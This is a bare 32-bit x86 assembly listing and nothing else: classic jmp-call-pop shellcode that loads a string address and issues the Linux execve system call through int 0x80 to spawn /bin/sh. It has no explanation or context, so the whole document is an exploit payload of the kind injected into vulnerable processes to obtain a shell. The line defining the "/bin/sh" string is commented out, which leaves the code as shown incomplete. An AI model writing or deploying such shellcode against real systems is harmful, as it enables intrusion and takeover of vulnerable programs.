BITS 32
global _start
_start:
    jmp loadstring
execve:
    pop ebx
    xor eax,eax
    xor ecx,ecx
    xor edx,edx
    mov al,0xb
    int 0x80
    ret
loadstring:
    call execve
    ;db "/bin/sh",0
